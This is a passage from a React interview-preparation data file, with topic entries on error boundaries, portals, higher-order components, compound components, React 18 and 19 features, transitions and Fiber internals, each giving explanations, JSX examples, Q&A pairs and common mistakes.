        "They catch errors in rendering, lifecycle methods and constructors of the tree below. They do **not** catch errors in event handlers, in async code like `setTimeout` or promises, in server rendering, or in the boundary itself. Use try/catch in handlers, or with react-error-boundary call `showBoundary(error)` to send an async error to the boundary.",
        "Place them at several levels: one near the root as a last resort, and smaller ones around independent widgets so one broken chart doesn't take down the whole dashboard.",
        "React 19 added root options `onCaughtError` and `onUncaughtError` on `createRoot`, which is a good single place to report errors to a tool like Sentry.",
      ],
      why: "One bug in one widget shouldn't destroy the whole page. Boundaries contain the damage and let you log the error.",
      analogy: "Circuit breakers in a house. A fault in the kitchen trips the kitchen breaker, and the rest of the house keeps its lights on.",
      code: {
        lang: 'jsx',
        source: `import { Component } from 'react';

export class ErrorBoundary extends Component {
  state = { error: null };

  static getDerivedStateFromError(error) {
    return { error }; // switch to the fallback on the next render
  }

  componentDidCatch(error, info) {
    // send to your logging service
    console.error('Caught by boundary:', error.message, info.componentStack);
  }

  render() {
    if (this.state.error) {
      return (
        <div role="alert">
          <p>Something went wrong in this section.</p>
          <button onClick={() => this.setState({ error: null })}>Try again</button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Usage: one widget fails, the rest of the dashboard keeps working
// <ErrorBoundary><RevenueChart /></ErrorBoundary>
// <ErrorBoundary><CandidateTable /></ErrorBoundary>`,
      },
      output: "If RevenueChart throws while rendering, only its section shows 'Something went wrong in this section.' with a 'Try again' button; CandidateTable still works. The error and component stack are logged. 'Try again' clears the error and re-renders the chart.",
      questions: [
        { q: "What is an error boundary?", a: "A class component that catches JavaScript errors thrown while rendering its children, shows fallback UI, and can log the error, so the rest of the app keeps working." },
        { q: "What errors do error boundaries NOT catch?", a: "Errors in event handlers, asynchronous code like timers and promises, server-side rendering, and errors thrown inside the boundary itself." },
        { q: "Can you write an error boundary with hooks?", a: "Not with built-in hooks; it still needs a class with getDerivedStateFromError or componentDidCatch. The react-error-boundary library wraps that class and adds hooks like useErrorBoundary." },
        { q: "How do you handle an error from an API call in a click handler?", a: "Catch it with try/catch and set error state, or use react-error-boundary's `showBoundary(error)` to pass it to the nearest boundary." },
      ],
      answer30: "An error boundary is a class component using getDerivedStateFromError and componentDidCatch that catches render errors in its subtree and shows a fallback, so one broken widget doesn't blank the whole app. It doesn't catch event handler or async errors, so I handle those with try/catch or react-error-boundary's showBoundary. I put one at the root and smaller ones around independent sections, and log errors to a monitoring tool.",
      mistakes: [
        "Expecting a boundary to catch errors from fetch calls in event handlers.",
        "Only one boundary at the root, so any error replaces the entire page.",
        "No reset path, so the user is stuck on the fallback until they reload.",
        "Trap: 'Does an error boundary catch its own errors?' No, it catches errors in its children. An error in its own render goes to the next boundary up.",
      ],
      takeaway: "Boundaries catch render errors below them; handle event and async errors yourself.",
    },

    {
      id: 'portals',
      title: 'Portals',
      level: 'intermediate',
      priority: 'good',
      frequency: 'occasional',
      summary: 'Render children into a different DOM node, like document.body, while keeping them in the same React tree.',
      what: [
        "`createPortal(children, domNode)` renders JSX into a DOM node outside the parent's DOM, usually `document.body`. It's used for modals, tooltips, dropdowns and toasts.",
        "The component still lives in the same place in the **React** tree, so it keeps reading context and receiving props from its parent.",
      ],
      deeper: [
        "Why it's needed: a modal inside a container with `overflow: hidden` or its own stacking context (from `transform`, `z-index`, etc.) can be clipped or hidden behind other content. Rendering it under `body` escapes that.",
        "Events bubble through the **React** tree, not the DOM tree. A click inside a portal triggers `onClick` handlers on React ancestors even though the DOM nodes aren't nested. This surprises people, so call `stopPropagation` if a parent shouldn't react.",
        "Accessibility is your job: trap focus inside the modal, close on Escape, return focus when it closes, and use `role='dialog'` and `aria-modal`. The native `<dialog>` element handles some of this for you.",
      ],
      why: "Overlays need to sit on top of everything, regardless of where in the component tree they are opened.",
      analogy: "A shop employee who works from home. On the org chart (React tree) they're still in the same team and get the same memos (context), but physically (DOM) they sit somewhere else.",
      code: {
        lang: 'jsx',
        source: `import { useState } from 'react';
import { createPortal } from 'react-dom';

function Modal({ onClose, children }) {
  return createPortal(
    <div className="backdrop" onClick={onClose}>
      <div role="dialog" aria-modal="true" onClick={(e) => e.stopPropagation()}>
        {children}
        <button onClick={onClose}>Close</button>
      </div>
    </div>,
    document.body // DOM target: outside the card
  );
}

export default function CandidateCard() {
  const [open, setOpen] = useState(false);
  return (
    <div style={{ overflow: 'hidden', height: 80 }} onClick={() => console.log('card clicked')}>
      <button onClick={() => setOpen(true)}>View CV</button>
      {open && <Modal onClose={() => setOpen(false)}>CV preview here</Modal>}
    </div>
  );
}`,
      },
      output: "The modal appears on top of the page instead of being clipped by the card's `overflow: hidden`, because its DOM lives under `body`. Clicking inside the dialog does not log 'card clicked' thanks to `stopPropagation`; without it, React would bubble the click up to the card's handler, even though in the DOM the modal isn't inside the card.",
      questions: [
        { q: "What is a portal used for?", a: "Rendering UI like modals, tooltips and toasts into a different DOM node, usually document.body, so parent CSS like overflow hidden or z-index stacking can't clip it." },
        { q: "Does a portal keep context from its parent?", a: "Yes. It stays in the same place in the React tree, so context, props and state work exactly as if it were rendered inline." },
        { q: "How do events bubble from a portal?", a: "Through the React component tree, not the DOM tree. A click inside a portal reaches onClick handlers on its React ancestors." },
      ],
      answer30: "A portal, created with createPortal, renders children into another DOM node, usually document.body, while keeping them in the same position in the React tree. I use it for modals, dropdowns and tooltips so parent styles like overflow hidden or z-index don't clip them. Context still works, and events bubble through the React tree, which can surprise people. I also handle focus trapping, Escape to close, and aria attributes for accessibility.",
      mistakes: [
        "Not expecting React events to bubble out of the portal to parent handlers.",
        "Forgetting focus management and Escape handling in modals.",
        "Calling `document.body` during server rendering, where there is no document.",
        "Trap: 'Is the portal outside the React tree?' No, only outside the parent's DOM. It is still a child in React.",
      ],
      takeaway: "Portals move DOM output elsewhere but keep React tree behaviour: context and event bubbling.",
    },

    {
      id: 'hoc-render-props',
      title: 'Higher-order components and render props',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: 'Two older patterns for sharing logic between components; custom hooks replaced most uses.',
      what: [
        "A **higher-order component (HOC)** is a function that takes a component and returns a new component with extra behaviour: `withAuth(Dashboard)`. Redux's old `connect()` and React Router's old `withRouter` were HOCs.",
        "A **render prop** is a prop whose value is a function that returns JSX. The component runs the logic and calls the function with its data: `<MouseTracker render={(pos) => <Cursor {...pos} />} />`. `children` can be the function too.",
      ],
      deeper: [
        "Both existed because class components couldn't share stateful logic easily. Since hooks (React 16.8), a custom hook is usually simpler: no extra wrapper components, no name clashes, and the data flow is visible.",
        "HOC problems: 'wrapper hell' in DevTools, props colliding when two HOCs inject the same name, and static methods and refs not passing through unless you handle them.",
        "They're still useful. HOCs suit cross-cutting wrappers like auth guards, feature flags or analytics around whole pages. Render props suit components that own behaviour but let the caller own markup, like virtualised lists (`rowRenderer`) or headless UI libraries.",
      ],
      why: "Interviewers ask about them because older codebases use them and because they test whether you understand why hooks were introduced.",
      analogy: "A HOC is gift wrapping: the same gift (component) comes out with extra features on the outside. A render prop is a cake mould where you choose the decoration: the mould does the baking, you decide what goes on top.",
      code: {
        lang: 'jsx',
        source: `import { useEffect, useState } from 'react';

// 1) HOC: wraps any page with an auth check
function withAuth(Component) {
  function WithAuth(props) {
    const user = useCurrentUser();
    if (!user) return <p>Please sign in.</p>;
    return <Component {...props} user={user} />;
  }
  WithAuth.displayName = 'withAuth(' + (Component.displayName || Component.name) + ')';
  return WithAuth;
}
export const ProtectedDashboard = withAuth(Dashboard);

// 2) Render prop: logic here, markup chosen by the caller
function WindowWidth({ children }) {
  const [width, setWidth] = useState(window.innerWidth);
  useEffect(() => {
    const onResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', onResize);
    return () => window.removeEventListener('resize', onResize);
  }, []);
  return children(width);
}
// <WindowWidth>{(w) => (w < 600 ? <MobileNav /> : <DesktopNav />)}</WindowWidth>

// 3) The modern way: a custom hook
function useWindowWidth() { /* same state + effect as above */ }
// const w = useWindowWidth();`,
      },
      output: "ProtectedDashboard shows 'Please sign in.' for guests and the dashboard with a `user` prop for signed-in users. WindowWidth re-renders its function child on every resize, switching between mobile and desktop navigation at 600px. The custom hook gives the same result with no wrapper component.",
      questions: [
        { q: "What is a higher-order component?", a: "A function that takes a component and returns a new component with added props or behaviour, like `withAuth(Page)`. It's a pattern, not a React API." },
        { q: "What is a render prop?", a: "A prop that is a function returning JSX. The component calls it with its internal data, so it shares logic while the caller decides what to render." },
        { q: "Why did hooks replace most HOCs and render props?", a: "Hooks share stateful logic without adding wrapper components, avoid prop name collisions, and make it obvious where values come from." },
        { q: "When would you still use a HOC today?", a: "For wrappers that apply to whole components, like route guards, error boundaries, feature flags, or analytics, especially when you can't edit the wrapped component." },
      ],
      answer30: "A higher-order component is a function that takes a component and returns an enhanced one, like withAuth. A render prop is a function prop that receives data and returns JSX, so the component owns logic and the caller owns markup. Both were the main ways to share logic before hooks; now I usually write a custom hook instead, because it avoids wrapper nesting and prop collisions. I still see HOCs for auth guards and render props in headless and virtualisation libraries.",
      mistakes: [
        "Creating a HOC inside render (`withAuth(Page)` inside a component): a new component type each render resets state.",
        "Not forwarding props or refs through the HOC.",
        "Two HOCs injecting a prop with the same name, one silently overwriting the other.",
        "Trap: 'Are HOCs deprecated?' No, they're a plain JavaScript pattern. They're just less common since hooks.",
      ],
      takeaway: "HOCs wrap components, render props pass a rendering function; custom hooks cover most of their use cases now.",
    },

    {
      id: 'compound-components',
      title: 'Compound components',
      level: 'advanced',
      priority: 'good',
      frequency: 'occasional',
      summary: 'A set of components that work together and share hidden state through context, like <Tabs>, <Tabs.List>, <Tabs.Panel>.',
      what: [
        "Compound components are a group of components designed to be used together, like the HTML `<select>` and `<option>`. The parent holds the shared state and the children read it from context.",
        "The caller gets a flexible, readable API: `<Tabs><Tabs.Tab>Profile</Tabs.Tab><Tabs.Panel>...</Tabs.Panel></Tabs>`, and can arrange, style or add elements between the pieces freely.",
      ],
      deeper: [
        "The alternative is a 'configuration' API: `<Tabs items={[{ label, content }]} />`. That's fine until people want an icon in one tab, a badge in another, or a custom wrapper. Each request adds another prop. Compound components avoid this 'prop explosion'.",
        "Implementation: create a context in the parent, put state and setters in it, and have each child call a hook like `useTabsContext()` that throws if used outside the parent.",
        "This is how headless UI libraries like Radix UI and Headless UI are built. They handle state and accessibility, and you supply the markup and styles.",
      ],
      why: "It gives reusable UI components an API that's both flexible and hard to misuse, without dozens of configuration props.",
      analogy: "A TV remote and its TV: separate pieces, but they're made as a set and talk to each other quietly. You can place them anywhere in the room.",
      code: {
        lang: 'jsx',
        source: `import { createContext, useContext, useState } from 'react';

const TabsContext = createContext(null);
function useTabs() {
  const ctx = useContext(TabsContext);
  if (!ctx) throw new Error('Tabs.* must be used inside <Tabs>');
  return ctx;
}

export function Tabs({ defaultTab, children }) {
  const [active, setActive] = useState(defaultTab);
  return <TabsContext.Provider value={{ active, setActive }}>{children}</TabsContext.Provider>;
}

Tabs.Tab = function Tab({ id, children }) {
  const { active, setActive } = useTabs();
  return (
    <button role="tab" aria-selected={active === id} onClick={() => setActive(id)}>
      {children}
    </button>
  );
};

Tabs.Panel = function Panel({ id, children }) {
  const { active } = useTabs();
  return active === id ? <div role="tabpanel">{children}</div> : null;
};

// Usage: the caller controls layout and content freely
// <Tabs defaultTab="cv">
//   <div className="tab-bar">
//     <Tabs.Tab id="cv">CV</Tabs.Tab>
//     <Tabs.Tab id="notes">Notes <span className="badge">3</span></Tabs.Tab>
//   </div>
//   <Tabs.Panel id="cv">CV content</Tabs.Panel>
//   <Tabs.Panel id="notes">Interview notes</Tabs.Panel>
// </Tabs>`,
      },
      output: "The CV panel shows first. Clicking 'Notes' updates the shared state in Tabs, so the Notes button gets `aria-selected=true` and the Notes panel replaces the CV panel. The caller added a wrapper div and a badge without Tabs needing any new props.",
      questions: [
        { q: "What are compound components?", a: "A set of components that are used together and share implicit state through context, like Tabs, Tabs.Tab and Tabs.Panel, giving the caller control over structure and markup." },
        { q: "Why use them instead of passing an array of items as a prop?", a: "They avoid a growing list of configuration props. Callers can add icons, wrappers or custom elements anywhere without the component needing to support each case." },
        { q: "How do the children get the shared state?", a: "Through a context created by the parent. Older versions used `React.Children.map` and `cloneElement`, but that breaks when children are wrapped in other elements, so context is preferred." },
      ],
      answer30: "Compound components are a group like Tabs, Tabs.Tab and Tabs.Panel that share state through a context the parent provides. The caller composes them however they like, so I don't need a new prop every time someone wants an icon or a wrapper. Each child uses a hook that throws if it's outside the parent. It's the pattern behind headless libraries like Radix.",
      mistakes: [
        "Using `cloneElement` to inject props, which breaks when a child is wrapped in a div.",
        "No error when a child is used outside its parent, leading to confusing undefined errors.",
        "Not memoising the context value in large compound components, causing extra re-renders.",
        "Trap: 'Isn't this just Context?' Context is the mechanism; compound components are the API design built on top of it.",
      ],
      takeaway: "Compound components share hidden state via context and give callers full control of layout.",
    },

    {
      id: 'react-18-concurrency-batching',
      title: 'React 18: concurrent rendering and automatic batching',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'React 18 made rendering interruptible and batches state updates everywhere, not just in event handlers.',
      what: [
        "**Automatic batching:** React groups several state updates into one re-render. Before React 18 this only happened inside React event handlers; updates in `setTimeout`, promises or native listeners each caused their own render. With `createRoot` in React 18+, they're batched everywhere.",
        "**Concurrent rendering:** React can start rendering an update, pause it to handle something more urgent (like a key press), and then continue or throw the old work away. You opt in per update with features like `useTransition`, `useDeferredValue` and Suspense.",
      ],
      deeper: [
        "To get React 18 behaviour you must switch from `ReactDOM.render` to `createRoot`. The old API ran in legacy mode and was removed in React 19.",
        "If you really need the DOM updated immediately (for example to measure it right after a state change), wrap the update in `flushSync` from `react-dom`. Use it rarely; it hurts performance.",
        "React 18 also brought streaming SSR with Suspense and selective hydration, `useId`, and `useSyncExternalStore` for libraries that subscribe to external stores (Redux, Zustand) without 'tearing', where different parts of the screen show different versions of the same data.",
      ],
      why: "Fewer renders means faster updates, and interruptible rendering keeps typing and clicking smooth even while a big part of the UI is re-rendering.",
      analogy: "Batching is a waiter who collects the whole table's order before going to the kitchen. Concurrent rendering is a chef who pauses a slow dish to plate a quick starter for a waiting customer, then goes back to the slow dish.",
      code: {
        lang: 'jsx',
        source: `import { useState } from 'react';
import { flushSync } from 'react-dom';

export default function Profile() {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(false);
  console.log('render');

  async function load() {
    setLoading(true);                 // render #1 (event handler)
    const res = await fetch('/api/me');
    const data = await res.json();
    // React 18+: both updates below cause ONE render, even after await.
    // React 17 with ReactDOM.render: two separate renders.
    setUser(data);
    setLoading(false);
  }

  function urgentScroll() {
    flushSync(() => setUser({ name: 'Temp' })); // opt out: DOM updated right now
    document.getElementById('bottom').scrollIntoView();
  }

  return (
    <>
      <button onClick={load}>Load</button>
      <button onClick={urgentScroll}>Scroll</button>
      <p>{loading ? 'Loading...' : user?.name}</p>
      <div id="bottom" />
    </>
  );
}`,
      },
      output: "Clicking Load logs 'render' twice in total: once for `setLoading(true)` and once for the batched `setUser` + `setLoading(false)` after the await. In React 17 legacy mode the last two would have caused separate renders. `flushSync` forces the DOM to update before the scroll line runs.",
      questions: [
        { q: "What is automatic batching?", a: "Since React 18 with createRoot, multiple state updates are grouped into one re-render wherever they happen: event handlers, timeouts, promises, and native listeners. Before, only React event handlers batched." },
        { q: "How do you opt out of batching?", a: "Wrap the update in `flushSync` from react-dom. React applies it and updates the DOM synchronously. Use it rarely." },
        { q: "What does concurrent rendering mean?", a: "Rendering can be interrupted, paused and resumed or abandoned, so urgent updates like typing aren't blocked by slower ones. It's enabled per update through transitions, deferred values and Suspense." },
        { q: "What do you need to change to upgrade to React 18 behaviour?", a: "Replace `ReactDOM.render` with `createRoot(container).render(<App />)`. Without that, the app runs in legacy mode with old behaviour." },
      ],
      answer30: "React 18 brought two big changes. Automatic batching groups state updates into one render everywhere, including after awaits and in timeouts, as long as you use createRoot; flushSync opts out. And concurrent rendering makes rendering interruptible, so React can pause a big, low-priority render to handle typing first. You use it through useTransition, useDeferredValue and Suspense. React 18 also added streaming SSR, useId and useSyncExternalStore.",
      mistakes: [
        "Upgrading the package but keeping `ReactDOM.render`, so nothing new turns on.",
        "Code that reads the DOM right after setState expecting it to be updated.",
        "Overusing flushSync.",
        "Trap: 'Is all rendering concurrent in React 18?' No. Updates are synchronous by default; only updates marked as transitions or deferred are interruptible.",
      ],
      takeaway: "createRoot gives batching everywhere and opt-in interruptible rendering.",
    },

    {
      id: 'use-transition-deferred-value',
      title: 'useTransition and useDeferredValue',
      level: 'advanced',
      priority: 'good',
      frequency: 'common',
      summary: 'Mark some updates as low priority so typing and clicking stay responsive while heavy UI re-renders.',
      what: [
        "`useTransition` returns `[isPending, startTransition]`. Updates you put inside `startTransition(() => ...)` are **non-urgent**: React renders them in the background and drops the work if a more urgent update (a key press) arrives.",
        "`useDeferredValue(value)` gives you a copy of a value that 'lags behind'. The urgent render uses the old value for the heavy part, then React re-renders with the new value in the background.",
        "Rule of thumb: use `useTransition` when you own the state setter; use `useDeferredValue` when you only receive the value (a prop) and want the expensive child to lag.",
      ],
      deeper: [
        "These don't make code faster; they change **priority**. The heavy render still happens, but it no longer blocks input. For the heavy child to actually skip urgent renders, it should be wrapped in `memo`.",
        "Controlled input values must not be set inside a transition; the input must update urgently, or typing feels broken. Keep two states: the input text (urgent) and the filter (transition), or use useDeferredValue on the text.",
        "Transitions also work with Suspense: a navigation wrapped in startTransition keeps showing the old screen instead of flashing a fallback. In React 19, `startTransition` accepts async functions (Actions), and `isPending` stays true until the async work finishes.",
        "Unlike debouncing, there's no fixed delay: on a fast device the deferred render happens almost immediately.",
      ],
      why: "Filtering a 10,000-row list on every keystroke can freeze the input. Transitions keep the input instant and let the list catch up.",
      analogy: "An ambulance and normal traffic. Typing is the ambulance; the big list update is normal traffic that pulls over to let it pass, then continues.",
      code: {
        lang: 'jsx',
        source: `import { memo, useDeferredValue, useState, useTransition } from 'react';

const SlowList = memo(function SlowList({ query }) {
  const items = [];
  for (let i = 0; i < 5000; i++) {
    if (('Candidate ' + i).includes(query)) items.push(<li key={i}>Candidate {i}</li>);
  }
  return <ul>{items}</ul>;
});

// A) useTransition: we own the setter
export function SearchA() {
  const [text, setText] = useState('');
  const [query, setQuery] = useState('');
  const [isPending, startTransition] = useTransition();

  function onChange(e) {
    setText(e.target.value);                              // urgent: input stays snappy
    startTransition(() => setQuery(e.target.value));      // non-urgent: big list
  }

  return (
    <>
      <input value={text} onChange={onChange} />
      {isPending && <small>Updating...</small>}
      <SlowList query={query} />
    </>
  );
}

// B) useDeferredValue: one state, deferred copy for the heavy part
export function SearchB() {
  const [text, setText] = useState('');
  const deferred = useDeferredValue(text);
  return (
    <>
      <input value={text} onChange={(e) => setText(e.target.value)} />
      <div style={{ opacity: text !== deferred ? 0.5 : 1 }}>
        <SlowList query={deferred} />
      </div>
    </>
  );
}`,
      },
      output: "In both versions, typing fast stays smooth: each character appears immediately. The list updates a moment later and intermediate renders are skipped if you keep typing. Version A shows 'Updating...' while the transition is pending; version B fades the stale list until it catches up.",
      questions: [
        { q: "What does useTransition do?", a: "It lets you mark state updates as non-urgent. React renders them in the background, can interrupt them for urgent input, and gives you `isPending` to show a subtle loading hint." },
        { q: "useTransition vs useDeferredValue?", a: "useTransition wraps the state update, so you need access to the setter. useDeferredValue wraps a value, useful when it comes from props or you can't change where it's set." },
        { q: "How is this different from debouncing?", a: "Debounce waits a fixed time before doing anything. Transitions start right away but can be interrupted, so fast devices see results instantly and slow devices stay responsive." },
        { q: "Can you put a controlled input's update inside startTransition?", a: "No. Input updates must be urgent or the input lags and can drop characters. Split into an urgent text state and a transition-driven query state." },
      ],
      answer30: "useTransition and useDeferredValue are React 18's concurrent features for prioritising updates. With useTransition I wrap a heavy state update in startTransition, so typing stays urgent and the expensive render happens in the background and can be interrupted; isPending lets me show a hint. useDeferredValue does the same for a value I receive, like a prop. They don't make rendering faster, they make it non-blocking, and the heavy child should be memoized to benefit.",
      mistakes: [
        "Wrapping the controlled input's own setState in startTransition.",
        "Expecting a speed-up without memoizing the heavy component.",
        "Using transitions for things that should be debounced at the network level, like search API calls.",
        "Trap: 'Does startTransition delay the update like setTimeout?' No. It runs right away at lower priority; setTimeout just delays and still blocks when it runs.",
      ],
      takeaway: "Transitions change priority, not speed: urgent input first, heavy UI when there's time.",
    },

    {
      id: 'react-19-features',
      title: 'React 19: Actions, useActionState, useOptimistic, use(), and the Compiler',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: 'React 19 adds Actions for async mutations and forms, new hooks for pending and optimistic state, use() for promises and context, ref as a prop, and the React Compiler.',
      note: "Versions as of late 2026: React 19 became stable in December 2024, 19.1 in March 2025 and 19.2 in October 2025 (adds `<Activity>` and `useEffectEvent`). React Compiler 1.0 became stable in October 2025 and works as a separate build plugin. Check react.dev/blog for anything newer before your interview.",
      what: [
        "**Actions:** functions that do async work inside a transition. React tracks pending state, errors and optimistic updates for you. You can pass an action straight to a form: `<form action={saveJob}>`; React calls it with the form's `FormData` and resets the form after success.",
        "**`useActionState(action, initialState)`** returns `[state, formAction, isPending]`: the last result of the action (like an error message), a wrapped action to pass to the form, and whether it's running. It was called `useFormState` in the canary releases.",
        "**`useFormStatus()`** (from `react-dom`) lets a child, like a submit button, read whether its parent form is submitting, without prop drilling.",
        "**`useOptimistic(state)`** shows the expected result immediately (a new comment, a liked heart) while the request runs, and automatically reverts if it fails.",
        "**`use(resource)`** reads a promise (suspending until it resolves) or a context. Unlike other hooks, it can be called inside conditions and loops.",
      ],
      deeper: [
        "Other changes: `ref` is a normal prop for function components; `<Context>` can be used directly as a provider instead of `<Context.Provider>`; ref callbacks can return a cleanup; `<title>`, `<meta>` and `<link>` rendered anywhere are hoisted into `<head>`; better hydration error messages showing a diff; and stylesheet and script loading support.",
        "Removed in 19: `ReactDOM.render` and `hydrate` (use `createRoot`/`hydrateRoot`), `propTypes` and `defaultProps` for function components (use TypeScript and default parameters), string refs, and legacy context.",
        "`use(promise)` needs a promise that's cached or created outside render (by a framework, a Server Component, or a cache). Creating a new promise during each render makes it suspend forever.",
        "**React Compiler** is a build-time Babel plugin that automatically adds memoization, so most manual `useMemo`, `useCallback` and `memo` become unnecessary. It reached 1.0 in October 2025 and relies on code following the rules of React. Server Components and Server Actions (`'use server'`) are also stable in React 19 but need a framework such as Next.js.",
      ],
      why: "Before 19, every form needed hand-written `isLoading`, `error` and optimistic state plus try/catch. Actions make the common mutation flow a few lines and consistent across the app.",
      analogy: "A restaurant's order system. You hand in the order (action), the screen shows 'preparing' (isPending), the dish appears on your table photo straight away (optimistic), and if the kitchen runs out, the photo is swapped back with an apology (revert and error state).",
      code: {
        lang: 'jsx',
        source: `import { useActionState, useOptimistic } from 'react';
import { useFormStatus } from 'react-dom';

function SubmitButton() {
  const { pending } = useFormStatus(); // reads the parent <form>
  return <button disabled={pending}>{pending ? 'Saving...' : 'Add note'}</button>;
}

export default function Notes({ notes, saveNote }) {
  const [optimisticNotes, addOptimistic] = useOptimistic(
    notes,
    (current, text) => [...current, { id: 'temp', text, sending: true }]
  );

  const [error, formAction] = useActionState(async (prevError, formData) => {
    const text = formData.get('text');
    if (!text) return 'Note cannot be empty';
    addOptimistic(text);          // show it now
    try {
      await saveNote(text);       // parent refreshes notes after this
      return null;                // no error
    } catch {
      return 'Could not save. Try again.'; // optimistic note disappears
    }
  }, null);

  return (
    <>
      <ul>
        {optimisticNotes.map((n) => (
          <li key={n.id} style={{ opacity: n.sending ? 0.5 : 1 }}>{n.text}</li>
        ))}
      </ul>
      <form action={formAction}>
        <input name="text" />
        <SubmitButton />
        {error && <p role="alert">{error}</p>}
      </form>
    </>
  );
}`,
      },
      output: "Submitting 'Call Asha' immediately shows it faded in the list, the button reads 'Saving...' and is disabled, and the input clears. When `saveNote` succeeds, the real note replaces the optimistic one. If it fails, the faded note disappears and 'Could not save. Try again.' appears. An empty submit shows 'Note cannot be empty' without calling the server.",
      questions: [
        { q: "What are Actions in React 19?", a: "Async functions run inside a transition, often passed to `<form action>`. React manages their pending state, errors, optimistic updates, and resets the form on success." },
        { q: "What does useActionState return?", a: "`[state, formAction, isPending]`: the latest value returned by the action, a wrapped action to give to a form or button, and a pending flag. The action receives the previous state and the FormData." },
        { q: "What is useOptimistic for?", a: "Showing the expected result of a mutation immediately while it's in flight. When the action finishes, the optimistic state is replaced by the real state, so a failure automatically reverts it." },
        { q: "How is use() different from other hooks?", a: "It reads a promise or context and can be called conditionally or in loops. With a promise it suspends until the value is ready, so it works with Suspense and error boundaries." },
        { q: "What is the React Compiler?", a: "A build-time tool, stable since v1.0 in October 2025, that automatically memoizes components and values so you rarely need useMemo, useCallback or memo. It assumes your code follows the rules of React." },
      ],
      answer30: "React 19's big idea is Actions: async functions run in a transition, which you can pass straight to a form's action prop. useActionState gives me the action's last result and a pending flag, useFormStatus lets a submit button know its form is submitting, and useOptimistic shows the result instantly and reverts on failure. use() reads promises and context and can be called conditionally. Also ref is a normal prop now, Context works as a provider, and document metadata hoists to head. Separately, the React Compiler hit 1.0 in 2025 and auto-memoizes, so manual useMemo and useCallback matter less.",
      mistakes: [
        "Calling `use(fetch(url))` with a new promise every render, which suspends forever.",
        "Thinking `useFormStatus` works in the same component that renders the form. It reads the **parent** form, so it must be in a child.",
        "Saying the React Compiler is part of React 19 itself. It's a separate build plugin.",
        "Trap: 'Does `<form action>` need a server?' No. On the client it's just an async function; Server Actions with `'use server'` need a framework like Next.js.",
      ],
      takeaway: "React 19 = Actions + useActionState/useFormStatus/useOptimistic for mutations, use() for promises and context, ref as a prop; the Compiler auto-memoizes.",
    },

    {
      id: 'fiber-in-depth',
      title: 'React Fiber in depth',
      level: 'advanced',
      priority: 'good',
      frequency: 'common',
      summary: 'Fiber is React\'s internal engine: a linked tree of work units that lets rendering be split up, paused, prioritised and resumed.',
      what: [
        "Before React 16, rendering was one long recursive call: once started, it couldn't stop until the whole tree was done, blocking the main thread. **Fiber** (React 16) rewrote the reconciler so each component instance becomes a small unit of work called a fiber.",
        "Because work is split into units, React can do some, check if the browser needs to handle something urgent, and come back later. That's the foundation of concurrent features like transitions and Suspense.",
      ],
      deeper: [
        "A fiber is a plain object for one component or element. It stores `type`, `key`, `props`, the hook list (`memoizedState`), pending updates, effect flags, and pointers: `child`, `sibling` and `return` (parent). These pointers turn the tree into a linked structure React can walk with a loop instead of recursion, so it can stop and resume anywhere.",
        "**Double buffering:** React keeps two trees. The `current` tree matches what's on screen. Rendering builds a `workInProgress` tree (fibers are linked to their counterparts through `alternate`). On commit, React swaps the pointer, and work-in-progress becomes current.",
        "**Two phases.** Render phase (`beginWork`/`completeWork` for each fiber): calls your components, diffs children, marks effects. It's pure and can be interrupted, repeated or thrown away. Commit phase: synchronous and not interruptible; it applies DOM mutations, runs layout effects, then schedules passive effects (`useEffect`).",
        "**Priorities via lanes:** each update gets a lane (a bit in a bitmask), such as sync for clicks and typing, or transition lanes. The scheduler works on the highest-priority lanes first and yields to the browser about every 5 ms in concurrent mode.",
        "Why hooks must keep their order: a component's hooks are stored as a linked list on its fiber. React matches them by position on every render.",
      ],
      why: "It explains why render must be pure (it may run more than once), why hook order matters, why effects run after commit, and how React can keep the UI responsive during big updates.",
      analogy: "Reading a long book with a bookmark. The old React had to read the whole book in one sitting. Fiber puts a bookmark after every page, so it can stop to answer the door (user input) and pick up exactly where it left off.",
      code: {
        lang: 'text',
        title: 'Simplified shape of a fiber and the work loop',
        source: `Fiber for <List>:
{
  type: List,            // function, class, or 'div'
  key: null,
  pendingProps, memoizedProps,
  memoizedState,         // hooks: useState -> useEffect -> useMemo (linked list)
  updateQueue,           // pending setState calls
  lanes,                 // priority bits of pending work
  flags,                 // Placement | Update | Deletion | Passive ...
  child,  sibling,  return,   // tree as a linked list
  alternate,             // the matching fiber in the other tree
}

Concurrent work loop (render phase):
  while (workInProgress !== null && !shouldYield()) {
    workInProgress = performUnitOfWork(workInProgress); // beginWork, then completeWork
  }
  // shouldYield() is true after ~5ms -> give the browser a turn, resume later

Commit phase (cannot be interrupted):
  1. before mutation   (read DOM snapshots)
  2. mutation          (insert / update / delete DOM nodes, detach old refs)
  3. swap trees        (root.current = finishedWork)
  4. layout            (attach refs, useLayoutEffect, componentDidMount)
  5. later: passive    (useEffect)`,
      },
      output: "This is a mental model, not runnable code. It shows why a big render can pause between fibers, why the commit phase is always all-or-nothing (the user never sees a half-updated DOM), and why useLayoutEffect runs before useEffect.",
      questions: [
        { q: "What problem did Fiber solve?", a: "The old stack reconciler rendered the whole tree recursively in one go, blocking the main thread. Fiber splits rendering into small units that can be paused, prioritised and resumed, enabling concurrent rendering." },
        { q: "What is a fiber?", a: "A JavaScript object representing one component or element, with its props, state and hooks, pending updates, effect flags, and child, sibling and return pointers that link the tree." },
        { q: "Which phase can be interrupted, render or commit?", a: "Only the render phase. The commit phase runs synchronously so the DOM is never left half-updated." },
        { q: "What are the current and workInProgress trees?", a: "Current mirrors the screen; workInProgress is built during rendering. Matching fibers point to each other via `alternate`, and on commit React swaps them. This is called double buffering." },
        { q: "How does Fiber explain the rules of hooks?", a: "A component's hooks are stored as a linked list on its fiber and matched by call order, so calling hooks conditionally would mismatch the stored state." },
      ],
      answer30: "Fiber is the reconciler React has used since version 16. Each component instance is a fiber object holding its props, hooks and pending updates, linked by child, sibling and return pointers, so React can walk the tree in a loop and pause between units. Rendering builds a work-in-progress tree, which is pure and interruptible, and the commit phase applies DOM changes synchronously and swaps it in as current. Updates have priority lanes, which is what makes transitions and Suspense possible.",
      mistakes: [
        "Saying Fiber is the virtual DOM. The virtual DOM is the elements you return; fibers are React's internal work objects built from them.",
        "Thinking concurrent rendering means multiple threads. It's all on the main thread; React just yields between units of work.",
